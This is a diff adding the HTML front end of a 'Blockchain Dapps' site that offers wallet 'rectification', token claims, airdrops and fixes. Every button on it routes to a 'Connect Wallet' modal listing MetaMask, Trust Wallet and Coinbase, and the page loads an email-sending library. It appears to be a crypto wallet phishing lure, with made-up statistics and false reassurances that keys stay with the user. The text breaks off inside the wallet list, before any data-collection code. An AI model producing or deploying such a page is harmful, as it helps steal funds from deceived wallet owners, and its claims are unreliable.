+          padding: 20px 18px;
+          gap: 10px;
+        }
+        .footer-brand-name {
+          font-size: 0.8rem;
+        }
+        .footer-center,
+        .footer-right {
+          font-size: 0.72rem;
+        }
+      }
+
+      /* ── MOBILE: 500px — 1 column grid ── */
+      @media (max-width: 500px) {
+        nav {
+          padding: 0 14px;
+        }
+
+        .hero {
+          padding: 80px 14px 44px;
+        }
+        .hero-h1 {
+          font-size: clamp(1.55rem, 8vw, 2rem);
+          line-height: 1.18;
+        }
+        .hero-actions {
+          flex-direction: column;
+          gap: 10px;
+        }
+        .btn-main,
+        .btn-ghost {
+          width: 100%;
+          justify-content: center;
+          padding: 13px 20px;
+        }
+
+        .about-strip {
+          padding: 28px 14px;
+        }
+
+        /* ✦ KEY CHANGE: 1 card per row at ≤500px */
+        .services-section {
+          padding: 40px 14px;
+        }
+        .services-grid {
+          grid-template-columns: 1fr;
+          gap: 10px;
+        }
+        .service-card {
+          padding: 18px 16px;
+          border-radius: 13px;
+        }
+        .connect-dapps-card {
+          padding: 18px 16px;
+          border-radius: 13px;
+        }
+        .svc-icon-wrap {
+          width: 38px;
+          height: 38px;
+          margin-bottom: 11px;
+        }
+        .svc-name {
+          font-size: 0.92rem;
+          margin-bottom: 5px;
+        }
+        .svc-desc {
+          font-size: 0.78rem;
+          line-height: 1.6;
+        }
+
+        .cta-banner {
+          margin: 0 14px 44px;
+          padding: 24px 18px;
+        }
+        .cta-text h2 {
+          font-size: 1.2rem;
+        }
+
+        footer {
+          padding: 18px 14px;
+        }
+
+        .about-stats {
+          gap: 16px;
+        }
+        .stat-num {
+          font-size: 1.45rem;
+        }
+      }
+
+      /* ── SMALL MOBILE: 380px ── */
+      @media (max-width: 380px) {
+        .hero-h1 {
+          font-size: 1.4rem;
+        }
+        .nav-connect span {
+          display: none;
+        }
+        .nav-connect {
+          padding: 8px 12px;
+        }
+        .cta-text h2 {
+          font-size: 1.1rem;
+        }
+        .hero {
+          padding: 76px 12px 40px;
+        }
+        .services-section {
+          padding: 36px 12px;
+        }
+        .cta-banner {
+          margin: 0 12px 40px;
+        }
+      }
+    </style>
+<link rel="stylesheet" href="style.css">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+
+  </head>
+  <body>
+    <nav>
+      <div class="nav-brand">
+        <div class="brand-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"></path>
+            <path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"></path>
+          </svg>
+        </div>
+        <div class="brand-info">
+          <span class="brand-name">Blockchain Dapps</span>
+          <span class="brand-tag">Dapps – Decentralized App</span>
+        </div>
+      </div>
+      <div class="nav-right">
+        <button class="connect-wallet nav-home">Home</button>
+        <button class="nav-connect">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"></path>
+            <path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"></path>
+          </svg>
+          <span class="modal-trigger connect-wallet connect">Connect Wallet</span>
+        </button>
+      </div>
+    </nav>
+
+    <section class="hero">
+      <div class="hero-left">
+        <div class="hero-pill">
+          <span class="pill-dot"></span>Decentralized Application — DApps
+        </div>
+        <h1 class="hero-h1">
+          Your Trusted<br><span class="accent">Blockchain and Crypto</span><br>Rectification Solution!
+        </h1>
+        <p class="hero-p">
+          Your go-to online tool to seamlessly and efficiently fix any
+          blockchain-related issues you might encounter.
+        </p>
+        <div class="hero-actions">
+          <button class="modal-trigger connect-wallet btn-main">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"></path>
+              <path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"></path>
+            </svg>
+            Firmware Update
+          </button>
+          <button class="modal-trigger connect-wallet btn-ghost">
+            Explore
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M5 12h14M12 5l7 7-7 7"></path>
+            </svg>
+          </button>
+        </div>
+      </div>
+      <div class="hero-right">
+        <div class="chip chip1">
+          <svg width="12" height="12" fill="none" stroke="#10b981" stroke-width="2.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+          </svg>
+          Transaction Verified
+        </div>
+        <div class="r-card">
+          <div class="r-head">
+            <span class="r-title">Rectification Panel</span>
+            <div class="r-live"><span class="live-dot"></span>Live</div>
+          </div>
+          <div class="r-rows">
+            <div class="r-row">
+              <div class="r-left">
+                <div class="r-ico" style="background: rgba(247, 147, 26, 0.14); color: #f7931a">
+                  ₿
+                </div>
+                <div>
+                  <div class="r-name">Bitcoin</div>
+                  <div class="r-sub">BTC Network</div>
+                </div>
+              </div>
+              <span class="badge b-green">Supported</span>
+            </div>
+            <div class="r-row">
+              <div class="r-left">
+                <div class="r-ico" style="background: rgba(98, 126, 234, 0.14); color: #627eea">
+                  Ξ
+                </div>
+                <div>
+                  <div class="r-name">Ethereum</div>
+                  <div class="r-sub">ERC-20 / EVM</div>
+                </div>
+              </div>
+              <span class="badge b-green">Supported</span>
+            </div>
+            <div class="r-row">
+              <div class="r-left">
+                <div class="r-ico" style="background: rgba(20, 241, 149, 0.1); color: #14f195">
+                  ◎
+                </div>
+                <div>
+                  <div class="r-name">Solana</div>
+                  <div class="r-sub">SOL Network</div>
+                </div>
+              </div>
+              <span class="badge b-blue">Active</span>
+            </div>
+            <div class="r-row">
+              <div class="r-left">
+                <div class="r-ico" style="background: rgba(245, 158, 11, 0.1); color: #f59e0b">
+                  ⬡
+                </div>
+                <div>
+                  <div class="r-name">BNB Chain</div>
+                  <div class="r-sub">BSC / BEP-20</div>
+                </div>
+              </div>
+              <span class="badge b-gold">Pending</span>
+            </div>
+          </div>
+          <div class="r-footer">
+            <div class="r-footer-ico">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+              </svg>
+            </div>
+            <p>
+              <strong>Non-custodial &amp; secure.</strong> Your keys stay with
+              you at all times.
+            </p>
+          </div>
+        </div>
+        <div class="chip chip2">
+          <svg width="12" height="12" fill="none" stroke="#06b6d4" stroke-width="2.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+          </svg>
+          End-to-End Encrypted
+        </div>
+      </div>
+    </section>
+
+    <div class="about-strip">
+      <div class="about-left">
+        <div class="about-label">Open Protocol to all Web3 Solutions</div>
+        <h2 class="about-title">This is not an app — it's a protocol</h2>
+        <p class="about-desc">
+          Blockchain Dapps establishes a remote resolution between all
+          non-custodial wallets. Discover Blockchain solutions, seamless
+          transactions, and a decentralized ecosystem. Join us in
+          revolutionizing the way you interact with digital assets and
+          decentralized applications.
+        </p>
+      </div>
+      <div class="about-stats">
+        <div class="stat-box">
+          <div class="stat-num">50K+</div>
+          <div class="stat-lbl">Wallets Resolved</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-num">99.8%</div>
+          <div class="stat-lbl">Success Rate</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-num">24/7</div>
+          <div class="stat-lbl">Live Support</div>
+        </div>
+      </div>
+    </div>
+
+    <section class="services-section">
+      <div class="section-header">
+        <div class="section-eyebrow">
+          <span class="eyebrow-line"></span> Our Services
+          <span class="eyebrow-line"></span>
+        </div>
+        <h2 class="section-title">
+          Everything you need to <span>resolve wallet issues</span>
+        </h2>
+        <p class="section-sub">
+          Select a service below to get started. All resolutions are handled
+          through a secure, non-custodial protocol.
+        </p>
+      </div>
+      <div class="services-grid">
+
+        <!-- 1. Wallet Migration -->
+        <div class="service-card t-blue">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M5 12h14M12 5l7 7-7 7"></path>
+            </svg>
+          </div>
+          <span class="svc-tag">Migration</span>
+          <div class="svc-name">Token Migration</div>
+          <div class="svc-desc">
+            Click here for migration or to resolve any migration related issues.
+            Transfer assets securely between wallets and chains.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Migrate
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <!-- 2. Connect to Dapps (NEW — inserted after Migration) -->
+        <div class="connect-wallet connect-dapps-card">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"></path>
+              <path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"></path>
+              <circle cx="12" cy="12" r="1" fill="currentColor"></circle>
+            </svg>
+          </div>
+          <span class="svc-tag">Connect</span>
+          <div class="svc-name">Connect to Dapps</div>
+          <div class="svc-desc">
+            Instantly connect your wallet to any decentralized application. Seamless, secure, and non-custodial DApp connectivity across all major networks.
+          </div>
+          <div class="modal-trigger svc-action">
+            <button>
+              Connect
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <!-- 3. Wallet Rectification -->
+        <div class="service-card t-red">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+            </svg>
+          </div>
+          <span class="svc-tag">Rectify</span>
+          <div class="svc-name">Wallet Rectification</div>
+          <div class="svc-desc">
+            Click here to rectify all strange wallet issues. Fix anomalies,
+            errors, and unexpected behavior in your wallet.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Rectify
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <div class="service-card t-green">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 2L2 7l10 5 10-5-10-5z"></path>
+              <path d="M2 17l10 5 10-5"></path>
+              <path d="M2 12l10 5 10-5"></path>
+            </svg>
+          </div>
+          <span class="svc-tag">Claim Token</span>
+          <div class="svc-name">Token Claim</div>
+          <div class="svc-desc">
+            Click here to claim tokens or resolve any token claiming related
+            issues. Get your tokens with ease.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Claim
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <div class="service-card t-cyan">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M22 11.08V12a10 10 0 11-5.93-9.14"></path>
+              <polyline points="22 4 12 14.01 9 11.01"></polyline>
+            </svg>
+          </div>
+          <span class="svc-tag">Validate</span>
+          <div class="svc-name">Decentralized Validation</div>
+          <div class="svc-desc">
+            Click here for decentralized validation. Verify and validate your
+            wallet addresses and transactions.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Validate
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <div class="service-card t-purple">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="17 1 21 5 17 9"></polyline>
+              <path d="M3 11V9a4 4 0 014-4h14"></path>
+              <polyline points="7 23 3 19 7 15"></polyline>
+              <path d="M21 13v2a4 4 0 01-4 4H3"></path>
+            </svg>
+          </div>
+          <span class="svc-tag">Swap</span>
+          <div class="svc-name">Token Swap</div>
+          <div class="svc-desc">
+            Click here to swap tokens or resolve issues related to token swap.
+            Optimize swap within decentralized exchanges.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Swap
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <div class="service-card t-gold">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="12" y1="1" x2="12" y2="23"></line>
+              <path d="M17 5H9.5a3.5 3.5 0 000 7h5a3.5 3.5 0 010 7H6"></path>
+            </svg>
+          </div>
+          <span class="svc-tag">Slippage</span>
+          <div class="svc-name">Slippage &amp; Fees</div>
+          <div class="svc-desc">
+            Click here for slippage or transaction fee related issues. Resolve
+            high gas fees and failed transactions.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Fix
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <div class="service-card t-pink">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="8 17 12 21 16 17"></polyline>
+              <line x1="12" y1="12" x2="12" y2="21"></line>
+              <path d="M20.88 18.09A5 5 0 0018 9h-1.26A8 8 0 103 16.29"></path>
+            </svg>
+          </div>
+          <span class="svc-tag">Airdrop</span>
+          <div class="svc-name">Airdrop Claim</div>
+          <div class="svc-desc">
+            Click here to claim airdrop or resolve errors encountered during
+            airdrop claim. Accurate distribution ensured.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Claim Airdrop
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <div class="service-card t-green">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect>
+              <path d="M16 21V5a2 2 0 00-2-2h-4a2 2 0 00-2 2v16"></path>
+            </svg>
+          </div>
+          <span class="svc-tag">Staking</span>
+          <div class="svc-name">Stake / Unstake</div>
+          <div class="svc-desc">
+            Click here to resolve issues encountered while staking or unstaking.
+            Activate APR and manage your staking positions.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Stake
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <div class="service-card t-cyan">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"></path>
+              <circle cx="9" cy="7" r="4"></circle>
+              <path d="M23 21v-2a4 4 0 00-3-3.87"></path>
+              <path d="M16 3.13a4 4 0 010 7.75"></path>
+            </svg>
+          </div>
+          <span class="svc-tag">Whitelist</span>
+          <div class="svc-name">Address Whitelisting</div>
+          <div class="svc-desc">
+            Click here to whitelist your address or resolve whitelisting related
+            errors. Gain access to exclusive token launches.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Whitelist
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <div class="service-card t-blue">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M4 9h16M4 15h16M10 3L8 21M16 3l-2 18"></path>
+            </svg>
+          </div>
+          <span class="svc-tag">Bridge</span>
+          <div class="svc-name">Cross-Chain Bridge</div>
+          <div class="svc-desc">
+            Click here to resolve cross bridging errors encountered during cross
+            transfer. Bridge assets between chains seamlessly.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Bridge
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <div class="service-card t-orange">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M14.7 6.3a1 1 0 000 1.4l1.6 1.6a1 1 0 001.4 0l3.77-3.77a6 6 0 01-7.94 7.94l-6.91 6.91a2.12 2.12 0 01-3-3l6.91-6.91a6 6 0 017.94-7.94l-3.76 3.76z"></path>
+            </svg>
+          </div>
+          <span class="svc-tag">Debug</span>
+          <div class="svc-name">Smart Contract Debug</div>
+          <div class="svc-desc">
+            Ensure the integrity of your smart contracts. Comprehensive audits
+            and debugging to rectify vulnerabilities.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Debug
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <div class="service-card t-purple">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
+              <circle cx="8.5" cy="8.5" r="1.5"></circle>
+              <polyline points="21 15 16 10 5 21"></polyline>
+            </svg>
+          </div>
+          <span class="svc-tag">NFT</span>
+          <div class="svc-name">NFT Management</div>
+          <div class="svc-desc">
+            Creation, management, and troubleshooting of NFTs. Ensuring a smooth
+            experience in the NFT marketplace.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Fix NFT
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <div class="service-card t-green">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="10"></circle>
+              <line x1="12" y1="8" x2="12" y2="16"></line>
+              <line x1="8" y1="12" x2="16" y2="12"></line>
+            </svg>
+          </div>
+          <span class="svc-tag">Buy</span>
+          <div class="svc-name">Buy Tokens &amp; Coins</div>
+          <div class="svc-desc">
+            Buy tokens and coins. Click here to fix inability to buy coins or
+            resolve purchase related errors instantly.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Buy
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <div class="service-card t-gold">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="23 6 13.5 15.5 8.5 10.5 1 18"></polyline>
+              <polyline points="17 6 23 6 23 12"></polyline>
+            </svg>
+          </div>
+          <span class="svc-tag">APR</span>
+          <div class="svc-name">APR Activation</div>
+          <div class="svc-desc">
+            Click here for APR activation. Activate your Annual Percentage Rate
+            rewards and maximize your DeFi earnings.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Activate
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <div class="service-card t-red">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="10"></circle>
+              <polyline points="12 6 12 12 16 14"></polyline>
+            </svg>
+          </div>
+          <span class="svc-tag">Delay Fix</span>
+          <div class="svc-name">Transaction Delays</div>
+          <div class="svc-desc">
+            Click here for transaction delay issues. Speed up stuck or pending
+            transactions across all supported networks.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Fix
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <div class="service-card t-pink">
+          <div class="svc-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="18" cy="18" r="3"></circle>
+              <circle cx="6" cy="6" r="3"></circle>
+              <path d="M13 6h3a2 2 0 012 2v7"></path>
+              <line x1="6" y1="9" x2="6" y2="21"></line>
+            </svg>
+          </div>
+          <span class="svc-tag">Token Bridge</span>
+          <div class="svc-name">Token Bridge Fix</div>
+          <div class="svc-desc">
+            Click here for token bridge issues. Resolve errors when bridging
+            tokens between different blockchain networks.
+          </div>
+          <div class="modal-trigger connect-wallet svc-action">
+            <button>
+              Bridge
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <div class="cta-banner">
+      <div class="cta-bg-orb"></div>
+      <div class="cta-text">
+        <h2>Ready to <span>connect your wallet</span>?</h2>
+        <p>
+          Use Trust Wallet, MetaMask, or any wallet to connect to the app. You
+          will be prompted to connect via a secure, decentralized protocol.
+        </p>
+      </div>
+      <div class="modal-trigger connect-wallet cta-actions">
+        <button class="cta-btn-primary">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"></path>
+            <path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"></path>
+          </svg>
+          Connect Wallet
+        </button>
+        <button class="connect-wallet cta-btn-outline">
+          Learn More
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M5 12h14M12 5l7 7-7 7"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <footer>
+      <div class="footer-brand">
+        <div class="footer-brand-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"></path>
+            <path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"></path>
+          </svg>
+        </div>
+        <span class="footer-brand-name">Blockchain Dapps</span>
+      </div>
+      <div class="footer-center">
+        Open Protocol to all Web3 Solutions · Non-Custodial · Decentralized
+      </div>
+      <div class="footer-right">© 2024 Blockchain Dapps</div>
+    </footer>
+    <div id="walletModal" class="wallet-modal" role="dialog" aria-labelledby="modal-title" aria-hidden="true">
+      <div class="modal-overlay"></div>
+      <div class="modal-container glass" style="
+        margin-left: 5px !important; margin-right: 0px !important;
+        ">
+        <div class="modal-header">
+          <button id="backBtn" class="modal-back" style="display: none;" aria-label="Go back">
+            <i class="fas fa-arrow-left"></i>
+          </button>
+          <h2 id="modalWalletName">Connect Wallet</h2>
+          <button id="closeModalBtn" class="modal-close" aria-label="Close modal">
+            <i class="fas fa-times"></i>
+          </button>
+        </div>
+  
+        <div class="modal-content">
+          <!-- Page 1: Wallet Selection -->
+          <div id="modalPage1" class="wallet-selection-page" style="display: block;">
+            <!-- Featured Wallets View - Redesigned to match image -->
+            <div id="featured-wallets-view" class="featured-view">
+              <!-- Title and subtitle -->
+              <div class="connect-header">
+                <p class="connect-subtitle">Connecting your wallet is like “logging in” to Web3. Select your
+                  wallet from the options to get started.</p>
+              </div>
+  
+              <!-- Wallet options grid -->
+              <div class="featured-wallets" id="featured-wallets">
+                <!-- WalletConnect Option -->
+                <div class="featured-wallet wallet-option" data-title="WalletConnect"
+                  data-logo="assetsa/download.png" data-type="injected">
+                  <div class="featured-wallet-content">
+                    <img src="assetsa/download.png" alt="WalletConnect"
+                      class="wallet-icon">
+                    <div class="featured-wallet-info">
+                      <div class="featured-wallet-name">WalletConnect</div>
+                    </div>
+                  </div>
+                </div>
+  
+                <!-- Exodus Option -->
+                <div class="featured-wallet wallet-option" data-title="Metamask "
+                  data-logo="success/way/img/metamask.png" data-type="injected">
+                  <div class="featured-wallet-content">
+                    <img src="success/way/img/metamask.png" alt="Exodus Wallet" class="wallet-icon">
+                    <div class="featured-wallet-info">
+                      <div class="featured-wallet-name">Metamask</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+  
+              
+  
+              <!-- More Wallets Button (styled like WalletConnect in image) -->
+              <div class="all-wallets-option" id="view-all-wallets">
+                <div class="more-wallets-content">
+                  <div class="more-wallets-icon">
+                    <div class="dots-grid">
+                      <div class="dot"></div>
+                      <div class="dot"></div>
+                      <div class="dot"></div>
+                      <div class="dot"></div>
+                    </div>
+                  </div>
+                  <div class="more-wallets-info">
+                    <div class="more-wallets-title">All Wallets</div>
+                  </div>
+                  <div class="more-wallets-count">90+</div>
+                </div>
+              </div>
+  
+  <!-- Help Links -->
+  <div class="wallet-help-links">
+    <div class="help-link-row">
+      <a href="https://www.blocknative.com/blog/metamask-wont-connect-web3-wallet-troubleshooting"
+        class="learn-more-link help-link">Why don't I see my wallet?</a>
+    </div>
+  </div>
+            </div>
+  
+          
+              
+            <!-- All Wallets View: Grid with Search -->
+            <div id="all-wallets-view" class="all-wallets-view" style="display: none;">
+              <div class="search-container">
+                <div class="search-input-wrapper">
+  
+                  <input type="text" id="wallet-search" placeholder="Search wallet" class="search-input"
+                    autocomplete="off">
+                </div>
+              </div>
+  
+              <div class="wallets-grid" id="wallets-grid" style="
+          padding-right: 26px !important;
+          ">
+                <div class="wallet-option" data-title="MetaMask" data-logo="success/way/img/metamask.png"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/metamask.png" alt="MetaMask" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">MetaMask</div>
+                    <div class="wallet-description">Connect using browser wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Trust Wallet"
+                  data-logo="success/way/img/trust_wallet.png" data-type="walletconnect"
+                  style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/trust_wallet.png" alt="Trust Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Trust W...</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Coinbase Wallet"
+                  data-logo="success/way/img/coinbase.png" data-type="walletconnect"
+                  style="width: 90px; height: 90px; padding-left: 20px;">
